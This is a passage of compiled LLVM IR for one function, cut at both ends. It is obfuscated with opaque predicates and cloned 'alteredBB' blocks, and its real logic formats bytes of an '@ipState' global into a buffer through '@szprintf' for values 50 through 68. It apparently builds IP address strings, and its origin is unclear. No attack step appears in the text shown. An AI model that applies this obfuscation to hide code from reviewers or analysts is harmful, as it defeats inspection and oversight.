  %972 = or i1 %970, %971
  br i1 %972, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %964, label %973, label %996

; <label>:973:                                    ; preds = %originalBBpart2112
  %974 = load i32, i32* @x.77
  %975 = load i32, i32* @y.78
  %976 = sub i32 %974, 1
  %977 = mul i32 %974, %976
  %978 = urem i32 %977, 2
  %979 = icmp eq i32 %978, 0
  %980 = icmp slt i32 %975, 10
  %981 = or i1 %979, %980
  br i1 %981, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %973
  %982 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %983 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %984 = zext i8 %983 to i32
  %985 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %986 = zext i8 %985 to i32
  %987 = call i32 (i8*, i8*, ...) @szprintf(i8* %982, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.235, i32 0, i32 0), i32 %984, i32 %986)
  %988 = load i32, i32* @x.77
  %989 = load i32, i32* @y.78
  %990 = sub i32 %988, 1
  %991 = mul i32 %988, %990
  %992 = urem i32 %991, 2
  %993 = icmp eq i32 %992, 0
  %994 = icmp slt i32 %989, 10
  %995 = or i1 %993, %994
  br i1 %995, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br label %996

; <label>:996:                                    ; preds = %originalBBpart2116, %originalBBpart2112
  %997 = load i32, i32* @x.77
  %998 = load i32, i32* @y.78
  %999 = sub i32 %997, 1
  %1000 = mul i32 %997, %999
  %1001 = urem i32 %1000, 2
  %1002 = icmp eq i32 %1001, 0
  %1003 = icmp slt i32 %998, 10
  %1004 = or i1 %1002, %1003
  br i1 %1004, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %996
  %1005 = load i32, i32* %1, align 4
  %1006 = icmp eq i32 %1005, 50
  %1007 = load i32, i32* @x.77
  %1008 = load i32, i32* @y.78
  %1009 = sub i32 %1007, 1
  %1010 = mul i32 %1007, %1009
  %1011 = urem i32 %1010, 2
  %1012 = icmp eq i32 %1011, 0
  %1013 = icmp slt i32 %1008, 10
  %1014 = or i1 %1012, %1013
  br i1 %1014, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %1006, label %1015, label %1022

; <label>:1015:                                   ; preds = %originalBBpart2120
  %1016 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1017 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1018 = zext i8 %1017 to i32
  %1019 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1020 = zext i8 %1019 to i32
  %1021 = call i32 (i8*, i8*, ...) @szprintf(i8* %1016, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.236, i32 0, i32 0), i32 %1018, i32 %1020)
  br label %1022

; <label>:1022:                                   ; preds = %1015, %originalBBpart2120
  %1023 = load i32, i32* %1, align 4
  %1024 = icmp eq i32 %1023, 51
  br i1 %1024, label %1025, label %1032

; <label>:1025:                                   ; preds = %1022
  %1026 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1027 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1028 = zext i8 %1027 to i32
  %1029 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1030 = zext i8 %1029 to i32
  %1031 = call i32 (i8*, i8*, ...) @szprintf(i8* %1026, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.202, i32 0, i32 0), i32 %1028, i32 %1030)
  br label %1032

; <label>:1032:                                   ; preds = %1025, %1022
  %1033 = load i32, i32* %1, align 4
  %1034 = icmp eq i32 %1033, 52
  br i1 %1034, label %1035, label %1042

; <label>:1035:                                   ; preds = %1032
  %1036 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1037 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1038 = zext i8 %1037 to i32
  %1039 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1040 = zext i8 %1039 to i32
  %1041 = call i32 (i8*, i8*, ...) @szprintf(i8* %1036, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.237, i32 0, i32 0), i32 %1038, i32 %1040)
  br label %1042

; <label>:1042:                                   ; preds = %1035, %1032
  %1043 = load i32, i32* @x.77
  %1044 = load i32, i32* @y.78
  %1045 = sub i32 %1043, 1
  %1046 = mul i32 %1043, %1045
  %1047 = urem i32 %1046, 2
  %1048 = icmp eq i32 %1047, 0
  %1049 = icmp slt i32 %1044, 10
  %1050 = or i1 %1048, %1049
  br i1 %1050, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %1042
  %1051 = load i32, i32* %1, align 4
  %1052 = icmp eq i32 %1051, 53
  %1053 = load i32, i32* @x.77
  %1054 = load i32, i32* @y.78
  %1055 = sub i32 %1053, 1
  %1056 = mul i32 %1053, %1055
  %1057 = urem i32 %1056, 2
  %1058 = icmp eq i32 %1057, 0
  %1059 = icmp slt i32 %1054, 10
  %1060 = or i1 %1058, %1059
  br i1 %1060, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %1052, label %1061, label %1068

; <label>:1061:                                   ; preds = %originalBBpart2124
  %1062 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1063 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1064 = zext i8 %1063 to i32
  %1065 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1066 = zext i8 %1065 to i32
  %1067 = call i32 (i8*, i8*, ...) @szprintf(i8* %1062, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.238, i32 0, i32 0), i32 %1064, i32 %1066)
  br label %1068

; <label>:1068:                                   ; preds = %1061, %originalBBpart2124
  %1069 = load i32, i32* @x.77
  %1070 = load i32, i32* @y.78
  %1071 = sub i32 %1069, 1
  %1072 = mul i32 %1069, %1071
  %1073 = urem i32 %1072, 2
  %1074 = icmp eq i32 %1073, 0
  %1075 = icmp slt i32 %1070, 10
  %1076 = or i1 %1074, %1075
  br i1 %1076, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1068
  %1077 = load i32, i32* %1, align 4
  %1078 = icmp eq i32 %1077, 54
  %1079 = load i32, i32* @x.77
  %1080 = load i32, i32* @y.78
  %1081 = sub i32 %1079, 1
  %1082 = mul i32 %1079, %1081
  %1083 = urem i32 %1082, 2
  %1084 = icmp eq i32 %1083, 0
  %1085 = icmp slt i32 %1080, 10
  %1086 = or i1 %1084, %1085
  br i1 %1086, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %1078, label %1087, label %1110

; <label>:1087:                                   ; preds = %originalBBpart2128
  %1088 = load i32, i32* @x.77
  %1089 = load i32, i32* @y.78
  %1090 = sub i32 %1088, 1
  %1091 = mul i32 %1088, %1090
  %1092 = urem i32 %1091, 2
  %1093 = icmp eq i32 %1092, 0
  %1094 = icmp slt i32 %1089, 10
  %1095 = or i1 %1093, %1094
  br i1 %1095, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1087
  %1096 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1097 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1098 = zext i8 %1097 to i32
  %1099 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1100 = zext i8 %1099 to i32
  %1101 = call i32 (i8*, i8*, ...) @szprintf(i8* %1096, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.239, i32 0, i32 0), i32 %1098, i32 %1100)
  %1102 = load i32, i32* @x.77
  %1103 = load i32, i32* @y.78
  %1104 = sub i32 %1102, 1
  %1105 = mul i32 %1102, %1104
  %1106 = urem i32 %1105, 2
  %1107 = icmp eq i32 %1106, 0
  %1108 = icmp slt i32 %1103, 10
  %1109 = or i1 %1107, %1108
  br i1 %1109, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %1110

; <label>:1110:                                   ; preds = %originalBBpart2132, %originalBBpart2128
  %1111 = load i32, i32* %1, align 4
  %1112 = icmp eq i32 %1111, 55
  br i1 %1112, label %1113, label %1120

; <label>:1113:                                   ; preds = %1110
  %1114 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1115 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1116 = zext i8 %1115 to i32
  %1117 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1118 = zext i8 %1117 to i32
  %1119 = call i32 (i8*, i8*, ...) @szprintf(i8* %1114, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.240, i32 0, i32 0), i32 %1116, i32 %1118)
  br label %1120

; <label>:1120:                                   ; preds = %1113, %1110
  %1121 = load i32, i32* @x.77
  %1122 = load i32, i32* @y.78
  %1123 = sub i32 %1121, 1
  %1124 = mul i32 %1121, %1123
  %1125 = urem i32 %1124, 2
  %1126 = icmp eq i32 %1125, 0
  %1127 = icmp slt i32 %1122, 10
  %1128 = or i1 %1126, %1127
  br i1 %1128, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1120
  %1129 = load i32, i32* %1, align 4
  %1130 = icmp eq i32 %1129, 56
  %1131 = load i32, i32* @x.77
  %1132 = load i32, i32* @y.78
  %1133 = sub i32 %1131, 1
  %1134 = mul i32 %1131, %1133
  %1135 = urem i32 %1134, 2
  %1136 = icmp eq i32 %1135, 0
  %1137 = icmp slt i32 %1132, 10
  %1138 = or i1 %1136, %1137
  br i1 %1138, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %1130, label %1139, label %1146

; <label>:1139:                                   ; preds = %originalBBpart2136
  %1140 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1141 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1142 = zext i8 %1141 to i32
  %1143 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1144 = zext i8 %1143 to i32
  %1145 = call i32 (i8*, i8*, ...) @szprintf(i8* %1140, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.241, i32 0, i32 0), i32 %1142, i32 %1144)
  br label %1146

; <label>:1146:                                   ; preds = %1139, %originalBBpart2136
  %1147 = load i32, i32* %1, align 4
  %1148 = icmp eq i32 %1147, 57
  br i1 %1148, label %1149, label %1172

; <label>:1149:                                   ; preds = %1146
  %1150 = load i32, i32* @x.77
  %1151 = load i32, i32* @y.78
  %1152 = sub i32 %1150, 1
  %1153 = mul i32 %1150, %1152
  %1154 = urem i32 %1153, 2
  %1155 = icmp eq i32 %1154, 0
  %1156 = icmp slt i32 %1151, 10
  %1157 = or i1 %1155, %1156
  br i1 %1157, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1149
  %1158 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1159 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1160 = zext i8 %1159 to i32
  %1161 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1162 = zext i8 %1161 to i32
  %1163 = call i32 (i8*, i8*, ...) @szprintf(i8* %1158, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.242, i32 0, i32 0), i32 %1160, i32 %1162)
  %1164 = load i32, i32* @x.77
  %1165 = load i32, i32* @y.78
  %1166 = sub i32 %1164, 1
  %1167 = mul i32 %1164, %1166
  %1168 = urem i32 %1167, 2
  %1169 = icmp eq i32 %1168, 0
  %1170 = icmp slt i32 %1165, 10
  %1171 = or i1 %1169, %1170
  br i1 %1171, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1172

; <label>:1172:                                   ; preds = %originalBBpart2140, %1146
  %1173 = load i32, i32* %1, align 4
  %1174 = icmp eq i32 %1173, 58
  br i1 %1174, label %1175, label %1198

; <label>:1175:                                   ; preds = %1172
  %1176 = load i32, i32* @x.77
  %1177 = load i32, i32* @y.78
  %1178 = sub i32 %1176, 1
  %1179 = mul i32 %1176, %1178
  %1180 = urem i32 %1179, 2
  %1181 = icmp eq i32 %1180, 0
  %1182 = icmp slt i32 %1177, 10
  %1183 = or i1 %1181, %1182
  br i1 %1183, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1175
  %1184 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1185 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1186 = zext i8 %1185 to i32
  %1187 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1188 = zext i8 %1187 to i32
  %1189 = call i32 (i8*, i8*, ...) @szprintf(i8* %1184, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.243, i32 0, i32 0), i32 %1186, i32 %1188)
  %1190 = load i32, i32* @x.77
  %1191 = load i32, i32* @y.78
  %1192 = sub i32 %1190, 1
  %1193 = mul i32 %1190, %1192
  %1194 = urem i32 %1193, 2
  %1195 = icmp eq i32 %1194, 0
  %1196 = icmp slt i32 %1191, 10
  %1197 = or i1 %1195, %1196
  br i1 %1197, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %1198

; <label>:1198:                                   ; preds = %originalBBpart2144, %1172
  %1199 = load i32, i32* %1, align 4
  %1200 = icmp eq i32 %1199, 59
  br i1 %1200, label %1201, label %1224

; <label>:1201:                                   ; preds = %1198
  %1202 = load i32, i32* @x.77
  %1203 = load i32, i32* @y.78
  %1204 = sub i32 %1202, 1
  %1205 = mul i32 %1202, %1204
  %1206 = urem i32 %1205, 2
  %1207 = icmp eq i32 %1206, 0
  %1208 = icmp slt i32 %1203, 10
  %1209 = or i1 %1207, %1208
  br i1 %1209, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1201
  %1210 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1211 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1212 = zext i8 %1211 to i32
  %1213 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1214 = zext i8 %1213 to i32
  %1215 = call i32 (i8*, i8*, ...) @szprintf(i8* %1210, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.244, i32 0, i32 0), i32 %1212, i32 %1214)
  %1216 = load i32, i32* @x.77
  %1217 = load i32, i32* @y.78
  %1218 = sub i32 %1216, 1
  %1219 = mul i32 %1216, %1218
  %1220 = urem i32 %1219, 2
  %1221 = icmp eq i32 %1220, 0
  %1222 = icmp slt i32 %1217, 10
  %1223 = or i1 %1221, %1222
  br i1 %1223, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br label %1224

; <label>:1224:                                   ; preds = %originalBBpart2148, %1198
  %1225 = load i32, i32* %1, align 4
  %1226 = icmp eq i32 %1225, 60
  br i1 %1226, label %1227, label %1234

; <label>:1227:                                   ; preds = %1224
  %1228 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1229 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1230 = zext i8 %1229 to i32
  %1231 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1232 = zext i8 %1231 to i32
  %1233 = call i32 (i8*, i8*, ...) @szprintf(i8* %1228, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.245, i32 0, i32 0), i32 %1230, i32 %1232)
  br label %1234

; <label>:1234:                                   ; preds = %1227, %1224
  %1235 = load i32, i32* %1, align 4
  %1236 = icmp eq i32 %1235, 61
  br i1 %1236, label %1237, label %1244

; <label>:1237:                                   ; preds = %1234
  %1238 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1239 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1240 = zext i8 %1239 to i32
  %1241 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1242 = zext i8 %1241 to i32
  %1243 = call i32 (i8*, i8*, ...) @szprintf(i8* %1238, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.246, i32 0, i32 0), i32 %1240, i32 %1242)
  br label %1244

; <label>:1244:                                   ; preds = %1237, %1234
  %1245 = load i32, i32* @x.77
  %1246 = load i32, i32* @y.78
  %1247 = sub i32 %1245, 1
  %1248 = mul i32 %1245, %1247
  %1249 = urem i32 %1248, 2
  %1250 = icmp eq i32 %1249, 0
  %1251 = icmp slt i32 %1246, 10
  %1252 = or i1 %1250, %1251
  br i1 %1252, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1244
  %1253 = load i32, i32* %1, align 4
  %1254 = icmp eq i32 %1253, 62
  %1255 = load i32, i32* @x.77
  %1256 = load i32, i32* @y.78
  %1257 = sub i32 %1255, 1
  %1258 = mul i32 %1255, %1257
  %1259 = urem i32 %1258, 2
  %1260 = icmp eq i32 %1259, 0
  %1261 = icmp slt i32 %1256, 10
  %1262 = or i1 %1260, %1261
  br i1 %1262, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br i1 %1254, label %1263, label %1270

; <label>:1263:                                   ; preds = %originalBBpart2152
  %1264 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1265 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1266 = zext i8 %1265 to i32
  %1267 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1268 = zext i8 %1267 to i32
  %1269 = call i32 (i8*, i8*, ...) @szprintf(i8* %1264, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.247, i32 0, i32 0), i32 %1266, i32 %1268)
  br label %1270

; <label>:1270:                                   ; preds = %1263, %originalBBpart2152
  %1271 = load i32, i32* @x.77
  %1272 = load i32, i32* @y.78
  %1273 = sub i32 %1271, 1
  %1274 = mul i32 %1271, %1273
  %1275 = urem i32 %1274, 2
  %1276 = icmp eq i32 %1275, 0
  %1277 = icmp slt i32 %1272, 10
  %1278 = or i1 %1276, %1277
  br i1 %1278, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1270
  %1279 = load i32, i32* %1, align 4
  %1280 = icmp eq i32 %1279, 63
  %1281 = load i32, i32* @x.77
  %1282 = load i32, i32* @y.78
  %1283 = sub i32 %1281, 1
  %1284 = mul i32 %1281, %1283
  %1285 = urem i32 %1284, 2
  %1286 = icmp eq i32 %1285, 0
  %1287 = icmp slt i32 %1282, 10
  %1288 = or i1 %1286, %1287
  br i1 %1288, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br i1 %1280, label %1289, label %1296

; <label>:1289:                                   ; preds = %originalBBpart2156
  %1290 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1291 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1292 = zext i8 %1291 to i32
  %1293 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1294 = zext i8 %1293 to i32
  %1295 = call i32 (i8*, i8*, ...) @szprintf(i8* %1290, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.248, i32 0, i32 0), i32 %1292, i32 %1294)
  br label %1296

; <label>:1296:                                   ; preds = %1289, %originalBBpart2156
  %1297 = load i32, i32* @x.77
  %1298 = load i32, i32* @y.78
  %1299 = sub i32 %1297, 1
  %1300 = mul i32 %1297, %1299
  %1301 = urem i32 %1300, 2
  %1302 = icmp eq i32 %1301, 0
  %1303 = icmp slt i32 %1298, 10
  %1304 = or i1 %1302, %1303
  br i1 %1304, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1296
  %1305 = load i32, i32* %1, align 4
  %1306 = icmp eq i32 %1305, 64
  %1307 = load i32, i32* @x.77
  %1308 = load i32, i32* @y.78
  %1309 = sub i32 %1307, 1
  %1310 = mul i32 %1307, %1309
  %1311 = urem i32 %1310, 2
  %1312 = icmp eq i32 %1311, 0
  %1313 = icmp slt i32 %1308, 10
  %1314 = or i1 %1312, %1313
  br i1 %1314, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br i1 %1306, label %1315, label %1322

; <label>:1315:                                   ; preds = %originalBBpart2160
  %1316 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1317 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1318 = zext i8 %1317 to i32
  %1319 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1320 = zext i8 %1319 to i32
  %1321 = call i32 (i8*, i8*, ...) @szprintf(i8* %1316, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.249, i32 0, i32 0), i32 %1318, i32 %1320)
  br label %1322

; <label>:1322:                                   ; preds = %1315, %originalBBpart2160
  %1323 = load i32, i32* @x.77
  %1324 = load i32, i32* @y.78
  %1325 = sub i32 %1323, 1
  %1326 = mul i32 %1323, %1325
  %1327 = urem i32 %1326, 2
  %1328 = icmp eq i32 %1327, 0
  %1329 = icmp slt i32 %1324, 10
  %1330 = or i1 %1328, %1329
  br i1 %1330, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1322
  %1331 = load i32, i32* %1, align 4
  %1332 = icmp eq i32 %1331, 65
  %1333 = load i32, i32* @x.77
  %1334 = load i32, i32* @y.78
  %1335 = sub i32 %1333, 1
  %1336 = mul i32 %1333, %1335
  %1337 = urem i32 %1336, 2
  %1338 = icmp eq i32 %1337, 0
  %1339 = icmp slt i32 %1334, 10
  %1340 = or i1 %1338, %1339
  br i1 %1340, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br i1 %1332, label %1341, label %1364

; <label>:1341:                                   ; preds = %originalBBpart2164
  %1342 = load i32, i32* @x.77
  %1343 = load i32, i32* @y.78
  %1344 = sub i32 %1342, 1
  %1345 = mul i32 %1342, %1344
  %1346 = urem i32 %1345, 2
  %1347 = icmp eq i32 %1346, 0
  %1348 = icmp slt i32 %1343, 10
  %1349 = or i1 %1347, %1348
  br i1 %1349, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1341
  %1350 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1351 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1352 = zext i8 %1351 to i32
  %1353 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1354 = zext i8 %1353 to i32
  %1355 = call i32 (i8*, i8*, ...) @szprintf(i8* %1350, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.250, i32 0, i32 0), i32 %1352, i32 %1354)
  %1356 = load i32, i32* @x.77
  %1357 = load i32, i32* @y.78
  %1358 = sub i32 %1356, 1
  %1359 = mul i32 %1356, %1358
  %1360 = urem i32 %1359, 2
  %1361 = icmp eq i32 %1360, 0
  %1362 = icmp slt i32 %1357, 10
  %1363 = or i1 %1361, %1362
  br i1 %1363, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %1364

; <label>:1364:                                   ; preds = %originalBBpart2168, %originalBBpart2164
  %1365 = load i32, i32* @x.77
  %1366 = load i32, i32* @y.78
  %1367 = sub i32 %1365, 1
  %1368 = mul i32 %1365, %1367
  %1369 = urem i32 %1368, 2
  %1370 = icmp eq i32 %1369, 0
  %1371 = icmp slt i32 %1366, 10
  %1372 = or i1 %1370, %1371
  br i1 %1372, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1364
  %1373 = load i32, i32* %1, align 4
  %1374 = icmp eq i32 %1373, 66
  %1375 = load i32, i32* @x.77
  %1376 = load i32, i32* @y.78
  %1377 = sub i32 %1375, 1
  %1378 = mul i32 %1375, %1377
  %1379 = urem i32 %1378, 2
  %1380 = icmp eq i32 %1379, 0
  %1381 = icmp slt i32 %1376, 10
  %1382 = or i1 %1380, %1381
  br i1 %1382, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br i1 %1374, label %1383, label %1406

; <label>:1383:                                   ; preds = %originalBBpart2172
  %1384 = load i32, i32* @x.77
  %1385 = load i32, i32* @y.78
  %1386 = sub i32 %1384, 1
  %1387 = mul i32 %1384, %1386
  %1388 = urem i32 %1387, 2
  %1389 = icmp eq i32 %1388, 0
  %1390 = icmp slt i32 %1385, 10
  %1391 = or i1 %1389, %1390
  br i1 %1391, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1383
  %1392 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1393 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1394 = zext i8 %1393 to i32
  %1395 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1396 = zext i8 %1395 to i32
  %1397 = call i32 (i8*, i8*, ...) @szprintf(i8* %1392, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.251, i32 0, i32 0), i32 %1394, i32 %1396)
  %1398 = load i32, i32* @x.77
  %1399 = load i32, i32* @y.78
  %1400 = sub i32 %1398, 1
  %1401 = mul i32 %1398, %1400
  %1402 = urem i32 %1401, 2
  %1403 = icmp eq i32 %1402, 0
  %1404 = icmp slt i32 %1399, 10
  %1405 = or i1 %1403, %1404
  br i1 %1405, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br label %1406

; <label>:1406:                                   ; preds = %originalBBpart2176, %originalBBpart2172
  %1407 = load i32, i32* %1, align 4
  %1408 = icmp eq i32 %1407, 67
  br i1 %1408, label %1409, label %1416

; <label>:1409:                                   ; preds = %1406
  %1410 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1411 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1412 = zext i8 %1411 to i32
  %1413 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1414 = zext i8 %1413 to i32
  %1415 = call i32 (i8*, i8*, ...) @szprintf(i8* %1410, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.252, i32 0, i32 0), i32 %1412, i32 %1414)
  br label %1416

; <label>:1416:                                   ; preds = %1409, %1406
  %1417 = load i32, i32* @x.77
  %1418 = load i32, i32* @y.78
  %1419 = sub i32 %1417, 1
  %1420 = mul i32 %1417, %1419
  %1421 = urem i32 %1420, 2
  %1422 = icmp eq i32 %1421, 0
  %1423 = icmp slt i32 %1418, 10
  %1424 = or i1 %1422, %1423
  br i1 %1424, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1416
  %1425 = load i32, i32* %1, align 4
  %1426 = icmp eq i32 %1425, 68
  %1427 = load i32, i32* @x.77
  %1428 = load i32, i32* @y.78
  %1429 = sub i32 %1427, 1
  %1430 = mul i32 %1427, %1429
  %1431 = urem i32 %1430, 2
  %1432 = icmp eq i32 %1431, 0
  %1433 = icmp slt i32 %1428, 10
  %1434 = or i1 %1432, %1433
  br i1 %1434, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br i1 %1426, label %1435, label %1458

; <label>:1435:                                   ; preds = %originalBBpart2180
  %1436 = load i32, i32* @x.77
  %1437 = load i32, i32* @y.78
  %1438 = sub i32 %1436, 1
  %1439 = mul i32 %1436, %1438
